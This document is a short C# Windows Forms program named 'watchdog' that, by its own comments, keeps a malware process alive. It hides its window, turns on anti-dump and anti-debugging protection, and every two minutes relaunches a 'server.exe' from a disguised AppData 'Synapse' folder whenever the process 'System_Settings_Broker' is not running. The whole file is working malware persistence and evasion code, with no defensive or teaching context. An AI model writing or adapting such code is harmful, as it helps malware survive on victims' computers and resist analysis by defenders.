using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace watchdog
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Minimized;
            this.ShowInTaskbar = false;

            bool AntiDump = true; // Set this to true if you want to prevent your assembly from being dumped from the memory
            bool AntiDebug = true; // Activates the process monitor and scans for debugger tools
            bool AntiEmulation = false; // Blocks emulation, virtual machines & sandboxie
            Guardian.Main.Start(AntiDump, AntiDebug, AntiEmulation);

            System.Timers.Timer timer = new System.Timers.Timer();
            timer.Interval = 120000; // check if malware is running every 120s
            timer.Elapsed += timer_Elapsed;
            timer.Start();
        }

        static void timer_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
        {
            if (Process.GetProcessesByName("System_Settings_Broker").Length > 0) // malware process name to check if it is running
            {
                // if it's running, do nothing
            }
            else 
            {
                // if it's not running, restart the malware
                    var dir = "C://Users//"+Environment.UserName+"//AppData//Roaming//Synapse//server.exe"; // malware installation dir
                    System.Diagnostics.Process.Start(dir);
            }
        }
    }
}
